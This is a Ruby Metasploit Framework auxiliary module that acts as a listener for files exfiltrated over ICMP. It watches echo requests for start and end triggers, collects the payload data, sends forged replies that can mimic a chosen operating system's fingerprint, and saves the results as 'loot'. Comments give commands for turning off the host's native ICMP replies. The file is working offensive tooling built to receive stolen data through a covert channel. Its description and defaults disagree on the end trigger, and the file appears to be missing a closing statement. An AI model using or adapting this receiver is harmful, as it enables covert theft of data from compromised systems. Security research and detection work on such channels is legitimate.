##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Capture
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'			=>	'ICMP Exfiltration',
			'Version'		=>	'$Revision$',
			'Description'	=>	%q{
				This module is designed to provide a server-side component to receive and store files
				exfiltrated over ICMP.

				To use this module you will need to send an initial ICMP echo request containing the
				specified trigger (defaults to '^BOF:') followed by the filename being sent. All data
				received from this source will automatically be added to the receive buffer until an
				ICMP echo request containing a specific end command (defaults to 'EOL') is received.
			},
			'Author'		=>	'Chris John Riley',
			'License'		=>	MSF_LICENSE,
			'References'	=>
				[
					# general
					['URL', 'http://blog.c22.cc'],
					# packetfu
					['URL','http://code.google.com/p/packetfu/']
				]
		)

		register_options([
			OptString.new('START_TRIGGER',	[true, 'Trigger to listen for (followed by filename)', '^BOF:']),
			OptString.new('END_TRIGGER',	[true, 'End of File command', '^EOF']),
			OptString.new('RESPONSE',		[true, 'Data to respond when initial trigger matches', 'BEGIN']),
			OptString.new('BPF_FILTER',		[true, 'BFP format filter to listen for', 'icmp']),
			OptString.new('INTERFACE',		[false, 'The name of the interface']),
		], self.class)

		register_advanced_options([
			OptString.new('CLOAK',	[false, 'Create the response packet using a specific OS fingerprint (windows, linux, freebsd)', 'linux']),
			OptBool.new('PROMISC',	[false, 'Enable/Disable promiscuous mode', false]),
		], self.class)

		deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK', 'TIMEOUT')
	end

	def run
		begin
			@interface = datastore['INTERFACE'] || Pcap.lookupdev
			@interface = get_interface_guid(@interface)
			@iface_ip = Pcap.lookupaddrs(@interface)[0]

			@filter = datastore['BPF_FILTER']
			@eoftrigger = datastore['END_TRIGGER']
			@boftrigger = datastore['START_TRIGGER']
			@response = datastore['RESPONSE']
			@promisc = datastore['PROMISC'] || false
			@cloak = datastore['CLOAK'].downcase || 'linux'

			@record = false

			if @promisc
				 print_status("Warning: Promiscuous mode enabled. This may cause issues!")
			end

			# start listner
			icmplistener

		rescue	=>	ex
			print_error(ex.message)
		ensure
			storefile
			print_status("Stopping ICMP listener on %s (%s)" % [@interface, @iface_ip])
		end
	end

	def icmplistener
		# start icmp listener

		print_good("ICMP Listener started on %s (%s). Monitoring for trigger packet containing %s" % [@interface, @iface_ip, @boftrigger])
		cap = PacketFu::Capture.new(:iface => @interface, :start => true, :filter => @filter, :promisc => @promisc)
		loop {
			cap.stream.each do |pkt|
				packet = PacketFu::Packet.parse(pkt)
				data = packet.payload[4..-1]

				if packet.is_icmp? and data =~ /#{@boftrigger}/

					print_status("#{Time.now}: SRC:%s ICMP (type %d code %d) DST:%s" % [packet.ip_saddr, packet.icmp_type, packet.icmp_code, packet.ip_daddr])

					# detect and warn if system is responding to ICMP echo requests
					# suggested fixes:
					#
					# (linux) echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
					# (Windows) netsh firewall set icmpsetting 8 disable
					# (Windows cont.) netsh firewall set opmode mode = ENABLE

					if packet.icmp_type == 0 and packet.icmp_code == 0 and packet.ip_saddr == @iface_ip
						raise RuntimeError , "Dectected ICMP echo response. Disable OS ICMP handling!"
					end

					if @record
						print_error("New file started without saving old data")
						storefile
					end

					@p_icmp = packet

					# begin recording stream
					@record = true
					@record_host = packet.ip_saddr
					@record_data = ''
					@filename = data[(@boftrigger.length-1)..-1].strip # set filename from icmp payload

					print_good("Beginning capture of %s data" % @filename)

					# create response packet icmp_pkt
					icmp_packet

					if not @icmp_response
						raise RuntimeError ,"Could not build ICMP resonse"
					else
						# send response packet icmp_pkt
						send_icmp
					end
					break

				elsif packet.is_icmp? and @record and @record_host == packet.ip_saddr
					# check for EOF marker, if not continue recording

					if data =~ /#{@eoftrigger}/
						print_status("%d bytes of data recevied in total" % @record_data.length)
						print_good("End of File received. Saving %s to loot" % @filename)
						storefile
						@p_icmp = packet

						# create response packet icmp_pkt
						icmp_packet

						if not @icmp_response
							raise RuntimeError , "Could not build ICMP resonse"
						else
							# send response packet icmp_pkt
							send_icmp
						end

						# turn off recording and clear status
						@record = false
						@record_host = ''
						@record_data = ''
					else
						@record_data << data.to_s()
						print_status("Received %s bytes of data from %s" % [data.length, packet.ip_saddr])
						@p_icmp = packet

						# create response packet icmp_pkt
						icmp_packet

						if not @icmp_response
							raise RuntimeError , "Could not build ICMP resonse"
						else
							# send response packet icmp_pkt
							send_icmp
						end
					end
				end
			end
		}
	end

	def icmp_packet
		# create icmp response

		begin

			@src_ip = @p_icmp.ip_daddr
			@src_mac = @p_icmp.eth_daddr
			@dst_ip = @p_icmp.ip_saddr
			@dst_mac = @p_icmp.eth_saddr
			@icmp_id = @p_icmp.payload[0,2]
			@icmp_seq = @p_icmp.payload[2,2]
			# create payload with matching id/seq
			@resp_payload = @icmp_id + @icmp_seq + @response

			icmp_pkt = PacketFu::ICMPPacket.new(:flavor => @cloak)
			icmp_pkt.eth_saddr = @src_mac
			icmp_pkt.eth_daddr = @dst_mac
			icmp_pkt.icmp_type = 0
			icmp_pkt.icmp_code = 0
			icmp_pkt.payload = @resp_payload
			icmp_pkt.ip_saddr = @src_ip
			icmp_pkt.ip_daddr = @dst_ip
			icmp_pkt.recalc
			@icmp_response = icmp_pkt
		rescue  =>  ex
			print_error(ex.message)
		end
	end

	def send_icmp
		# send icmp response

		begin
			@icmp_response.to_w(iface = @interface)
			if datastore['VERBOSE']
				print_good("Response sent to %s containing %d bytes of data" % [@dst_ip, @response.length])
			end
		rescue  =>  ex
			print_error(ex.message)
		end
	end

	def storefile
		# store the file

		if not @record_data.length == 0
			loot = store_loot(
					"icmp_exfil",
					"text/xml",
					@src_ip,
					@record_data,
					@filename,
					"ICMP Exfiltrated Data"
					)
			print_good("Incoming file %s saved to loot" % @filename)
			print_good("Loot filename: %s" % loot)
	end
end